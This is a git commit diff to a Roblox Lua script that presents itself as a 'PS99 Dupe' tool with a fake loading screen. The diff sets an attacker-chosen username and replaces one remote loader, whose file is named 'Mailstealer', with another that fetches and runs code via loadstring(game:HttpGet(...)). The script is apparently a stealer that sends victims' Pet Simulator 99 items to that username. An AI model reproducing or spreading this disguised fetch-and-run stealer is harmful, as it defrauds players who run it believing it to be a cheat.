42b26886be5109feb6fb2ff3d0254572144bb53b
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2023-12-30 15:10:02 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,3 +1,11 @@
 Username = "loadstping"
-LoadScreen = true -- If you want to loadgui disabled, rename to false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/Mailstealer"))()
+loadingscreen = true
+farmui = true -- set to false if u dont want to load it
+--below only if loadingscreen = true
+_G.CustomScriptName = "PS99 Dupe" -- Main text 
+_G.Text1 = "Script Loaded..." --tip test1
+_G.Text2 = "Waiting for Script" --tip test1
+_G.Text3 = "Checking Scripts..." --tip test1
+_G.Text4 = "Starting Scripts..." --tip test1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
